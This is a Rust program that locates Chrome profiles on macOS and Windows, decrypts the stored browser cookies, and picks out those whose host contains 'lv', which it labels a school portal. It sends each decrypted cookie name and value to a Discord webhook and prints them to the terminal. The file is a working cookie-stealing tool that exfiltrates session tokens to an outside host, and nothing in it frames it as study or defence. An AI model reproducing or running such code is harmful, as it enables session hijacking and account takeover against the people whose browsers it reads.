use std::{env, fs};

use decrypt_cookies::{browser::info::ChromiumInfo, Browser, ChromiumBuilder, FirefoxBuilder};
use dirs::home_dir;
use dotenv::dotenv;
use serde_json::Value;
use terminal_size::{terminal_size, Height, Width};
use webhook::client::WebhookClient;

const OS: &str = env::consts::OS;

#[tokio::main]
pub async fn main() -> miette::Result<()> {
    dotenv().ok();

    let discord_webhook_url =
        std::env::var("DISCORD_WEBHOOK_URL").expect("DISCORD_WEBHOOK_URL must be set.");
    let chromium = ChromiumBuilder::new(Browser::Chrome).build().await?;
    let info = chromium.info();
    let local_state = fs::read_to_string(info.local_state()).unwrap();
    let v: Value = serde_json::from_str(&local_state).unwrap();
    let profiles_raw = v["profile"]["info_cache"].clone();
    let mut profiles = Vec::new();
    for (profile, _) in profiles_raw.as_object().unwrap() {
        profiles.push(profile);
    }
    println!("{:?}", profiles);
    let mut chromium = ChromiumBuilder::new(Browser::Chrome);
    let home_directory = home_dir().unwrap();
    let home_directory = home_directory.to_str().unwrap();
    let std_path = if env::consts::OS == "macos" {
        format!(
            "{}/Library/Application Support/Google/Chrome/",
            home_directory
        )
    } else if env::consts::OS == "windows" {
        format!(
            r#"{}\AppData\Local\Google\Chrome\User Data"#,
            home_directory
        )
    } else {
        String::new()
    };
    for profile in profiles {
        let path = if OS == "macos" {
            format!("{std_path}/{profile}/Cookies")
        } else if OS == "windows" {
            format!(r#"{std_path}\{profile}\Network\Cookies"#)
        } else {
            String::new()
        };
        let chrome = ChromiumBuilder::new(Browser::Chrome)
            .cookies_path(&path)
            .clone()
            .build()
            .await?;
        let cookies = chrome.get_cookies_all().await?;
        let lvis_cookies = cookies
            .iter()
            .filter(|cookie| cookie.host_key.contains("lv"))
            .collect::<Vec<_>>();
        if lvis_cookies.is_empty() {
            println!("No cookies for school portal in {profile}");
        } else {
            let client: WebhookClient = WebhookClient::new(&discord_webhook_url);
            for cookie in &lvis_cookies {
                client
                    .send(|msg| {
                        msg.content(&format!(
                            "{} : {}",
                            cookie.name,
                            &cookie
                                .decrypted_value
                                .clone()
                                .unwrap()
                                .split("wB�I")
                                .collect::<Vec<_>>()[1],
                        ))
                    })
                    .await
                    .unwrap();
            }
            let size = terminal_size();
            if let Some((Width(w), Height(_))) = size {
                let w = w as usize;
                println!("\n{:=^w$}", "");
                println!("Cookies of school portal in {profile}:");
                for cookie in lvis_cookies {
                    println!(
                        "{} : {}",
                        cookie.name,
                        &cookie
                            .decrypted_value
                            .clone()
                            .unwrap()
                            .split("wB�I")
                            .collect::<Vec<_>>()[1]
                    );
                }

                println!("{:=^w$}\n", "");
            } else {
                println!("\n{:-^50}\n", "");
                println!("Cookies of school portal in {profile}:");
                for cookie in lvis_cookies {
                    println!(
                        "{} : {:?}",
                        cookie.name,
                        &cookie
                            .decrypted_value
                            .clone()
                            .unwrap()
                            .split("wB�I")
                            .collect::<Vec<_>>()[1]
                    );
                }
                println!("\n{:-^50}\n", "");
            }
        }
    }

    Ok(())
}
